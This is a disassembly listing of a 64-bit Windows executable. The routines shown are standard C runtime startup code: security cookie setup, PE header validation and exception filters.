   140008938:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   14000893d:	33 c9                	xor    %ecx,%ecx
   14000893f:	ff 15 fb 0a 00 00    	call   *0xafb(%rip)        # 0x140009440
   140008945:	eb 23                	jmp    0x14000896a
   140008947:	48 8b 05 3a 3a 00 00 	mov    0x3a3a(%rip),%rax        # 0x14000c388
   14000894e:	48 8b 00             	mov    (%rax),%rax
   140008951:	48 89 05 90 3a 00 00 	mov    %rax,0x3a90(%rip)        # 0x14000c3e8
   140008958:	48 8b 05 29 3a 00 00 	mov    0x3a29(%rip),%rax        # 0x14000c388
   14000895f:	48 83 c0 08          	add    $0x8,%rax
   140008963:	48 89 05 1e 3a 00 00 	mov    %rax,0x3a1e(%rip)        # 0x14000c388
   14000896a:	48 8b 05 77 3a 00 00 	mov    0x3a77(%rip),%rax        # 0x14000c3e8
   140008971:	48 89 05 e8 38 00 00 	mov    %rax,0x38e8(%rip)        # 0x14000c260
   140008978:	c7 05 ce 38 00 00 09 	movl   $0xc0000409,0x38ce(%rip)        # 0x14000c250
   14000897f:	04 00 c0 
   140008982:	c7 05 c8 38 00 00 01 	movl   $0x1,0x38c8(%rip)        # 0x14000c254
   140008989:	00 00 00 
   14000898c:	c7 05 d2 38 00 00 01 	movl   $0x1,0x38d2(%rip)        # 0x14000c268
   140008993:	00 00 00 
   140008996:	b8 08 00 00 00       	mov    $0x8,%eax
   14000899b:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000899f:	48 8d 0d ca 38 00 00 	lea    0x38ca(%rip),%rcx        # 0x14000c270
   1400089a6:	48 c7 04 01 08 00 00 	movq   $0x8,(%rcx,%rax,1)
   1400089ad:	00 
   1400089ae:	48 8d 0d 4b 06 00 00 	lea    0x64b(%rip),%rcx        # 0x140009000
   1400089b5:	e8 5a fd ff ff       	call   0x140008714
   1400089ba:	48 83 c4 78          	add    $0x78,%rsp
   1400089be:	c3                   	ret
   1400089bf:	cc                   	int3
   1400089c0:	cc                   	int3
   1400089c1:	cc                   	int3
   1400089c2:	cc                   	int3
   1400089c3:	cc                   	int3
   1400089c4:	cc                   	int3
   1400089c5:	cc                   	int3
   1400089c6:	cc                   	int3
   1400089c7:	cc                   	int3
   1400089c8:	71 93                	jno    0x14000895d
   1400089ca:	d3 12                	rcll   %cl,(%rdx)
   1400089cc:	c1 3f c1             	sarl   $0xc1,(%rdi)
   1400089cf:	e3 48                	jrcxz  0x140008a19
   1400089d1:	83 ec 28             	sub    $0x28,%esp
   1400089d4:	48 8b 01             	mov    (%rcx),%rax
   1400089d7:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   1400089dd:	75 23                	jne    0x140008a02
   1400089df:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   1400089e3:	75 1d                	jne    0x140008a02
   1400089e5:	8b 48 20             	mov    0x20(%rax),%ecx
   1400089e8:	8d 81 e0 fa 6c e6    	lea    -0x19930520(%rcx),%eax
   1400089ee:	83 f8 02             	cmp    $0x2,%eax
   1400089f1:	76 08                	jbe    0x1400089fb
   1400089f3:	81 f9 00 40 99 01    	cmp    $0x1994000,%ecx
   1400089f9:	75 07                	jne    0x140008a02
   1400089fb:	ff 15 c7 0b 00 00    	call   *0xbc7(%rip)        # 0x1400095c8
   140008a01:	cc                   	int3
   140008a02:	33 c0                	xor    %eax,%eax
   140008a04:	48 83 c4 28          	add    $0x28,%rsp
   140008a08:	c3                   	ret
   140008a09:	cc                   	int3
   140008a0a:	cc                   	int3
   140008a0b:	cc                   	int3
   140008a0c:	cc                   	int3
   140008a0d:	cc                   	int3
   140008a0e:	cc                   	int3
   140008a0f:	cc                   	int3
   140008a10:	cc                   	int3
   140008a11:	cc                   	int3
   140008a12:	cc                   	int3
   140008a13:	cc                   	int3
   140008a14:	cc                   	int3
   140008a15:	cc                   	int3
   140008a16:	cc                   	int3
   140008a17:	cc                   	int3
   140008a18:	71 30                	jno    0x140008a4a
   140008a1a:	52                   	push   %rdx
   140008a1b:	5e                   	pop    %rsi
   140008a1c:	47 27                	rex.RXB (bad)
   140008a1e:	05 d3 48 83 ec       	add    $0xec8348d3,%eax
   140008a23:	28 48 8d             	sub    %cl,-0x73(%rax)
   140008a26:	0d a5 ff ff ff       	or     $0xffffffa5,%eax
   140008a2b:	ff 15 1f 0a 00 00    	call   *0xa1f(%rip)        # 0x140009450
   140008a31:	33 c0                	xor    %eax,%eax
   140008a33:	48 83 c4 28          	add    $0x28,%rsp
   140008a37:	c3                   	ret
   140008a38:	cc                   	int3
   140008a39:	cc                   	int3
   140008a3a:	cc                   	int3
   140008a3b:	cc                   	int3
   140008a3c:	cc                   	int3
   140008a3d:	cc                   	int3
   140008a3e:	ff 25 f4 0b 00 00    	jmp    *0xbf4(%rip)        # 0x140009638
   140008a44:	cc                   	int3
   140008a45:	cc                   	int3
   140008a46:	cc                   	int3
   140008a47:	cc                   	int3
   140008a48:	cc                   	int3
   140008a49:	cc                   	int3
   140008a4a:	cc                   	int3
   140008a4b:	cc                   	int3
   140008a4c:	48 83 ec 18          	sub    $0x18,%rsp
   140008a50:	33 d2                	xor    %edx,%edx
   140008a52:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140008a56:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140008a5a:	77 3c                	ja     0x140008a98
   140008a5c:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140008a61:	66 39 01             	cmp    %ax,(%rcx)
   140008a64:	75 2a                	jne    0x140008a90
   140008a66:	39 51 3c             	cmp    %edx,0x3c(%rcx)
   140008a69:	7c 25                	jl     0x140008a90
   140008a6b:	81 79 3c 00 00 00 10 	cmpl   $0x10000000,0x3c(%rcx)
   140008a72:	73 1c                	jae    0x140008a90
   140008a74:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140008a78:	48 03 c1             	add    %rcx,%rax
   140008a7b:	48 89 04 24          	mov    %rax,(%rsp)
   140008a7f:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140008a85:	48 0f 45 c2          	cmovne %rdx,%rax
   140008a89:	48 8b d0             	mov    %rax,%rdx
   140008a8c:	48 89 04 24          	mov    %rax,(%rsp)
   140008a90:	eb 06                	jmp    0x140008a98
   140008a92:	33 d2                	xor    %edx,%edx
   140008a94:	48 89 14 24          	mov    %rdx,(%rsp)
   140008a98:	48 8b c2             	mov    %rdx,%rax
   140008a9b:	48 83 c4 18          	add    $0x18,%rsp
   140008a9f:	c3                   	ret
   140008aa0:	cc                   	int3
   140008aa1:	cc                   	int3
   140008aa2:	cc                   	int3
   140008aa3:	cc                   	int3
   140008aa4:	cc                   	int3
   140008aa5:	cc                   	int3
   140008aa6:	cc                   	int3
   140008aa7:	cc                   	int3
   140008aa8:	40 53                	rex push %rbx
   140008aaa:	48 83 ec 20          	sub    $0x20,%rsp
   140008aae:	8b d9                	mov    %ecx,%ebx
   140008ab0:	33 c9                	xor    %ecx,%ecx
   140008ab2:	ff 15 f0 08 00 00    	call   *0x8f0(%rip)        # 0x1400093a8
   140008ab8:	48 85 c0             	test   %rax,%rax
   140008abb:	74 28                	je     0x140008ae5
   140008abd:	48 8b c8             	mov    %rax,%rcx
   140008ac0:	e8 87 ff ff ff       	call   0x140008a4c
   140008ac5:	48 85 c0             	test   %rax,%rax
   140008ac8:	74 1b                	je     0x140008ae5
   140008aca:	b9 02 00 00 00       	mov    $0x2,%ecx
   140008acf:	66 39 48 5c          	cmp    %cx,0x5c(%rax)
   140008ad3:	75 04                	jne    0x140008ad9
   140008ad5:	8b c1                	mov    %ecx,%eax
   140008ad7:	eb 0e                	jmp    0x140008ae7
   140008ad9:	66 83 78 5c 03       	cmpw   $0x3,0x5c(%rax)
   140008ade:	b8 01 00 00 00       	mov    $0x1,%eax
   140008ae3:	74 02                	je     0x140008ae7
   140008ae5:	8b c3                	mov    %ebx,%eax
   140008ae7:	48 83 c4 20          	add    $0x20,%rsp
   140008aeb:	5b                   	pop    %rbx
   140008aec:	c3                   	ret
   140008aed:	cc                   	int3
   140008aee:	cc                   	int3
   140008aef:	cc                   	int3
   140008af0:	cc                   	int3
   140008af1:	cc                   	int3
   140008af2:	cc                   	int3
   140008af3:	ff 25 37 0b 00 00    	jmp    *0xb37(%rip)        # 0x140009630
   140008af9:	cc                   	int3
   140008afa:	cc                   	int3
   140008afb:	cc                   	int3
   140008afc:	cc                   	int3
   140008afd:	cc                   	int3
   140008afe:	cc                   	int3
   140008aff:	cc                   	int3
   140008b00:	33 c0                	xor    %eax,%eax
   140008b02:	c3                   	ret
   140008b03:	cc                   	int3
   140008b04:	cc                   	int3
   140008b05:	cc                   	int3
   140008b06:	cc                   	int3
   140008b07:	cc                   	int3
   140008b08:	cc                   	int3
   140008b09:	cc                   	int3
   140008b0a:	cc                   	int3
   140008b0b:	cc                   	int3
   140008b0c:	cc                   	int3
   140008b0d:	cc                   	int3
   140008b0e:	cc                   	int3
   140008b0f:	cc                   	int3
   140008b10:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   140008b14:	45 33 c9             	xor    %r9d,%r9d
   140008b17:	4c 03 c1             	add    %rcx,%r8
   140008b1a:	4c 8b d2             	mov    %rdx,%r10
   140008b1d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140008b22:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   140008b27:	48 83 c0 18          	add    $0x18,%rax
   140008b2b:	49 03 c0             	add    %r8,%rax
   140008b2e:	45 85 db             	test   %r11d,%r11d
   140008b31:	74 1e                	je     0x140008b51
   140008b33:	8b 50 0c             	mov    0xc(%rax),%edx
   140008b36:	4c 3b d2             	cmp    %rdx,%r10
   140008b39:	72 0a                	jb     0x140008b45
   140008b3b:	8b 48 08             	mov    0x8(%rax),%ecx
   140008b3e:	03 ca                	add    %edx,%ecx
   140008b40:	4c 3b d1             	cmp    %rcx,%r10
   140008b43:	72 0e                	jb     0x140008b53
   140008b45:	41 ff c1             	inc    %r9d
   140008b48:	48 83 c0 28          	add    $0x28,%rax
   140008b4c:	45 3b cb             	cmp    %r11d,%r9d
   140008b4f:	72 e2                	jb     0x140008b33
   140008b51:	33 c0                	xor    %eax,%eax
   140008b53:	c3                   	ret
   140008b54:	cc                   	int3
   140008b55:	cc                   	int3
   140008b56:	cc                   	int3
   140008b57:	cc                   	int3
   140008b58:	cc                   	int3
   140008b59:	cc                   	int3
   140008b5a:	cc                   	int3
   140008b5b:	cc                   	int3
   140008b5c:	cc                   	int3
   140008b5d:	cc                   	int3
   140008b5e:	cc                   	int3
   140008b5f:	cc                   	int3
   140008b60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b65:	57                   	push   %rdi
   140008b66:	48 83 ec 20          	sub    $0x20,%rsp
   140008b6a:	48 8b d9             	mov    %rcx,%rbx
   140008b6d:	48 8d 3d 8c 74 ff ff 	lea    -0x8b74(%rip),%rdi        # 0x140000000
   140008b74:	48 8b cf             	mov    %rdi,%rcx
   140008b77:	e8 44 00 00 00       	call   0x140008bc0
   140008b7c:	85 c0                	test   %eax,%eax
   140008b7e:	74 22                	je     0x140008ba2
   140008b80:	48 2b df             	sub    %rdi,%rbx
   140008b83:	48 8b d3             	mov    %rbx,%rdx
   140008b86:	48 8b cf             	mov    %rdi,%rcx
   140008b89:	e8 82 ff ff ff       	call   0x140008b10
   140008b8e:	48 85 c0             	test   %rax,%rax
   140008b91:	74 0f                	je     0x140008ba2
   140008b93:	8b 40 24             	mov    0x24(%rax),%eax
   140008b96:	c1 e8 1f             	shr    $0x1f,%eax
   140008b99:	f7 d0                	not    %eax
   140008b9b:	83 e0 01             	and    $0x1,%eax
   140008b9e:	eb 02                	jmp    0x140008ba2
   140008ba0:	33 c0                	xor    %eax,%eax
   140008ba2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008ba7:	48 83 c4 20          	add    $0x20,%rsp
   140008bab:	5f                   	pop    %rdi
   140008bac:	c3                   	ret
   140008bad:	cc                   	int3
   140008bae:	cc                   	int3
   140008baf:	cc                   	int3
   140008bb0:	cc                   	int3
   140008bb1:	cc                   	int3
   140008bb2:	cc                   	int3
   140008bb3:	cc                   	int3
   140008bb4:	cc                   	int3
   140008bb5:	cc                   	int3
   140008bb6:	cc                   	int3
   140008bb7:	cc                   	int3
   140008bb8:	cc                   	int3
   140008bb9:	cc                   	int3
   140008bba:	cc                   	int3
   140008bbb:	cc                   	int3
   140008bbc:	cc                   	int3
   140008bbd:	cc                   	int3
   140008bbe:	cc                   	int3
   140008bbf:	cc                   	int3
   140008bc0:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140008bc5:	66 39 01             	cmp    %ax,(%rcx)
   140008bc8:	75 20                	jne    0x140008bea
   140008bca:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140008bce:	48 03 c1             	add    %rcx,%rax
   140008bd1:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140008bd7:	75 11                	jne    0x140008bea
   140008bd9:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   140008bde:	66 39 48 18          	cmp    %cx,0x18(%rax)
   140008be2:	75 06                	jne    0x140008bea
   140008be4:	b8 01 00 00 00       	mov    $0x1,%eax
   140008be9:	c3                   	ret
   140008bea:	33 c0                	xor    %eax,%eax
   140008bec:	c3                   	ret
   140008bed:	cc                   	int3
   140008bee:	cc                   	int3
   140008bef:	cc                   	int3
   140008bf0:	cc                   	int3
   140008bf1:	cc                   	int3
   140008bf2:	cc                   	int3
   140008bf3:	cc                   	int3
   140008bf4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008bf9:	55                   	push   %rbp
   140008bfa:	48 8b ec             	mov    %rsp,%rbp
   140008bfd:	48 83 ec 20          	sub    $0x20,%rsp
   140008c01:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140008c06:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140008c0d:	2b 00 00 
   140008c10:	48 8b 05 f1 33 00 00 	mov    0x33f1(%rip),%rax        # 0x14000c008
   140008c17:	48 3b c3             	cmp    %rbx,%rax
   140008c1a:	0f 85 93 00 00 00    	jne    0x140008cb3
   140008c20:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140008c24:	ff 15 4e 08 00 00    	call   *0x84e(%rip)        # 0x140009478
   140008c2a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140008c2e:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140008c32:	ff 15 30 08 00 00    	call   *0x830(%rip)        # 0x140009468
   140008c38:	8b c0                	mov    %eax,%eax
   140008c3a:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140008c3e:	ff 15 2c 08 00 00    	call   *0x82c(%rip)        # 0x140009470
   140008c44:	8b c0                	mov    %eax,%eax
   140008c46:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140008c4a:	ff 15 30 08 00 00    	call   *0x830(%rip)        # 0x140009480
   140008c50:	8b c0                	mov    %eax,%eax
   140008c52:	48 c1 e0 18          	shl    $0x18,%rax
   140008c56:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140008c5a:	ff 15 20 08 00 00    	call   *0x820(%rip)        # 0x140009480
   140008c60:	8b c0                	mov    %eax,%eax
   140008c62:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140008c66:	48 33 45 10          	xor    0x10(%rbp),%rax
   140008c6a:	48 33 c1             	xor    %rcx,%rax
   140008c6d:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140008c71:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140008c75:	ff 15 e5 07 00 00    	call   *0x7e5(%rip)        # 0x140009460
   140008c7b:	8b 45 20             	mov    0x20(%rbp),%eax
   140008c7e:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140008c85:	ff 00 00 
   140008c88:	48 c1 e0 20          	shl    $0x20,%rax
   140008c8c:	48 33 45 20          	xor    0x20(%rbp),%rax
   140008c90:	48 33 45 10          	xor    0x10(%rbp),%rax
   140008c94:	48 23 c1             	and    %rcx,%rax
   140008c97:	48 8b c8             	mov    %rax,%rcx
   140008c9a:	48 3b c3             	cmp    %rbx,%rax
   140008c9d:	75 0d                	jne    0x140008cac
   140008c9f:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   140008ca6:	2b 00 00 
   140008ca9:	48 8b c8             	mov    %rax,%rcx
   140008cac:	48 89 0d 55 33 00 00 	mov    %rcx,0x3355(%rip)        # 0x14000c008
   140008cb3:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140008cb8:	48 f7 d0             	not    %rax
   140008cbb:	48 89 05 4e 33 00 00 	mov    %rax,0x334e(%rip)        # 0x14000c010
   140008cc2:	48 83 c4 20          	add    $0x20,%rsp
   140008cc6:	5d                   	pop    %rbp
   140008cc7:	c3                   	ret
   140008cc8:	71 71                	jno    0x140008d3b
   140008cca:	54                   	push   %rsp
   140008ccb:	58                   	pop    %rax
   140008ccc:	e6 07                	out    %al,$0x7
   140008cce:	88 d8                	mov    %bl,%al
   140008cd0:	33 c0                	xor    %eax,%eax
   140008cd2:	c3                   	ret
   140008cd3:	cc                   	int3
   140008cd4:	cc                   	int3
   140008cd5:	cc                   	int3
   140008cd6:	cc                   	int3
   140008cd7:	cc                   	int3
   140008cd8:	cc                   	int3
   140008cd9:	ff 25 71 09 00 00    	jmp    *0x971(%rip)        # 0x140009650
   140008cdf:	cc                   	int3
   140008ce0:	cc                   	int3
   140008ce1:	cc                   	int3
   140008ce2:	cc                   	int3
   140008ce3:	cc                   	int3
   140008ce4:	cc                   	int3
   140008ce5:	ff 25 fd 08 00 00    	jmp    *0x8fd(%rip)        # 0x1400095e8
   140008ceb:	cc                   	int3
   140008cec:	cc                   	int3
   140008ced:	cc                   	int3
   140008cee:	cc                   	int3
   140008cef:	cc                   	int3
   140008cf0:	cc                   	int3
   140008cf1:	cc                   	int3
   140008cf2:	cc                   	int3
   140008cf3:	cc                   	int3
   140008cf4:	cc                   	int3
   140008cf5:	cc                   	int3
   140008cf6:	cc                   	int3
   140008cf7:	cc                   	int3
   140008cf8:	cc                   	int3
   140008cf9:	cc                   	int3
   140008cfa:	cc                   	int3
   140008cfb:	cc                   	int3
   140008cfc:	cc                   	int3
   140008cfd:	cc                   	int3
   140008cfe:	cc                   	int3
   140008cff:	cc                   	int3
   140008d00:	c2 00 00             	ret    $0x0
   140008d03:	cc                   	int3
   140008d04:	cc                   	int3
   140008d05:	cc                   	int3
   140008d06:	cc                   	int3
   140008d07:	cc                   	int3
   140008d08:	cc                   	int3
   140008d09:	cc                   	int3
   140008d0a:	cc                   	int3
   140008d0b:	cc                   	int3
   140008d0c:	cc                   	int3
   140008d0d:	cc                   	int3
   140008d0e:	cc                   	int3
   140008d0f:	cc                   	int3
   140008d10:	cc                   	int3
   140008d11:	cc                   	int3
   140008d12:	cc                   	int3
   140008d13:	cc                   	int3
   140008d14:	cc                   	int3
   140008d15:	cc                   	int3
   140008d16:	cc                   	int3
   140008d17:	cc                   	int3
   140008d18:	48 83 ec 28          	sub    $0x28,%rsp
   140008d1c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140008d20:	48 8b ca             	mov    %rdx,%rcx
   140008d23:	49 8b d1             	mov    %r9,%rdx
   140008d26:	e8 11 00 00 00       	call   0x140008d3c
   140008d2b:	b8 01 00 00 00       	mov    $0x1,%eax
   140008d30:	48 83 c4 28          	add    $0x28,%rsp
   140008d34:	c3                   	ret
   140008d35:	cc                   	int3
   140008d36:	cc                   	int3
   140008d37:	cc                   	int3
   140008d38:	cc                   	int3
   140008d39:	cc                   	int3
   140008d3a:	cc                   	int3
   140008d3b:	cc                   	int3
   140008d3c:	40 53                	rex push %rbx
   140008d3e:	45 8b 18             	mov    (%r8),%r11d
   140008d41:	48 8b da             	mov    %rdx,%rbx
   140008d44:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140008d48:	4c 8b c9             	mov    %rcx,%r9
   140008d4b:	41 f6 00 04          	testb  $0x4,(%r8)
   140008d4f:	4c 8b d1             	mov    %rcx,%r10
   140008d52:	74 13                	je     0x140008d67
   140008d54:	41 8b 40 08          	mov    0x8(%r8),%eax
   140008d58:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140008d5c:	f7 d8                	neg    %eax
   140008d5e:	4c 03 d1             	add    %rcx,%r10
   140008d61:	48 63 c8             	movslq %eax,%rcx
   140008d64:	4c 23 d1             	and    %rcx,%r10
   140008d67:	49 63 c3             	movslq %r11d,%rax
   140008d6a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140008d6e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008d72:	8b 48 08             	mov    0x8(%rax),%ecx
   140008d75:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008d79:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140008d7e:	74 0b                	je     0x140008d8b
   140008d80:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140008d85:	83 e0 f0             	and    $0xfffffff0,%eax
   140008d88:	4c 03 c8             	add    %rax,%r9
   140008d8b:	4c 33 ca             	xor    %rdx,%r9
   140008d8e:	49 8b c9             	mov    %r9,%rcx
   140008d91:	5b                   	pop    %rbx
   140008d92:	e9 59 f9 ff ff       	jmp    0x1400086f0
   140008d97:	cc                   	int3
   140008d98:	cc                   	int3
   140008d99:	cc                   	int3
   140008d9a:	cc                   	int3
   140008d9b:	cc                   	int3
   140008d9c:	cc                   	int3
   140008d9d:	ff 25 b5 08 00 00    	jmp    *0x8b5(%rip)        # 0x140009658
   140008da3:	cc                   	int3
   140008da4:	cc                   	int3
   140008da5:	cc                   	int3
   140008da6:	cc                   	int3
   140008da7:	cc                   	int3
   140008da8:	cc                   	int3
   140008da9:	ff 25 41 08 00 00    	jmp    *0x841(%rip)        # 0x1400095f0
   140008daf:	cc                   	int3
   140008db0:	cc                   	int3
   140008db1:	cc                   	int3
   140008db2:	cc                   	int3
   140008db3:	cc                   	int3
   140008db4:	cc                   	int3
   140008db5:	cc                   	int3
   140008db6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008dbd:	00 00 00 
   140008dc0:	ff e0                	jmp    *%rax
   140008dc2:	cc                   	int3
   140008dc3:	cc                   	int3
   140008dc4:	cc                   	int3
   140008dc5:	cc                   	int3
   140008dc6:	cc                   	int3
   140008dc7:	cc                   	int3
   140008dc8:	cc                   	int3
   140008dc9:	cc                   	int3
   140008dca:	cc                   	int3
   140008dcb:	cc                   	int3
   140008dcc:	cc                   	int3
   140008dcd:	cc                   	int3
   140008dce:	cc                   	int3
   140008dcf:	cc                   	int3
   140008dd0:	cc                   	int3
   140008dd1:	cc                   	int3
   140008dd2:	cc                   	int3
   140008dd3:	cc                   	int3
   140008dd4:	cc                   	int3
   140008dd5:	cc                   	int3
   140008dd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008ddd:	00 00 00 
   140008de0:	ff 25 8a 08 00 00    	jmp    *0x88a(%rip)        # 0x140009670
   140008de6:	cc                   	int3
   140008de7:	cc                   	int3
   140008de8:	cc                   	int3
   140008de9:	cc                   	int3
   140008dea:	cc                   	int3
   140008deb:	cc                   	int3
   140008dec:	cc                   	int3
   140008ded:	cc                   	int3
   140008dee:	cc                   	int3
   140008def:	cc                   	int3
   140008df0:	40 55                	rex push %rbp
   140008df2:	48 83 ec 20          	sub    $0x20,%rsp
   140008df6:	48 8b ea             	mov    %rdx,%rbp
   140008df9:	48 8b 01             	mov    (%rcx),%rax
   140008dfc:	48 8b d1             	mov    %rcx,%rdx
   140008dff:	8b 08                	mov    (%rax),%ecx
   140008e01:	e8 38 fc ff ff       	call   0x140008a3e
   140008e06:	90                   	nop
   140008e07:	48 83 c4 20          	add    $0x20,%rsp
   140008e0b:	5d                   	pop    %rbp
   140008e0c:	c3                   	ret
   140008e0d:	cc                   	int3
   140008e0e:	cc                   	int3
   140008e0f:	cc                   	int3
   140008e10:	cc                   	int3
   140008e11:	cc                   	int3
   140008e12:	cc                   	int3
   140008e13:	cc                   	int3
   140008e14:	cc                   	int3
   140008e15:	cc                   	int3
   140008e16:	cc                   	int3
   140008e17:	cc                   	int3
   140008e18:	cc                   	int3
   140008e19:	cc                   	int3
   140008e1a:	cc                   	int3
   140008e1b:	cc                   	int3
   140008e1c:	cc                   	int3
   140008e1d:	cc                   	int3
   140008e1e:	cc                   	int3
   140008e1f:	cc                   	int3
   140008e20:	40 55                	rex push %rbp
   140008e22:	48 83 ec 20          	sub    $0x20,%rsp
   140008e26:	48 8b ea             	mov    %rdx,%rbp
   140008e29:	48 8b 01             	mov    (%rcx),%rax
   140008e2c:	33 c9                	xor    %ecx,%ecx
   140008e2e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140008e34:	0f 94 c1             	sete   %cl
   140008e37:	8b c1                	mov    %ecx,%eax
   140008e39:	48 83 c4 20          	add    $0x20,%rsp
   140008e3d:	5d                   	pop    %rbp
   140008e3e:	c3                   	ret
   140008e3f:	cc                   	int3
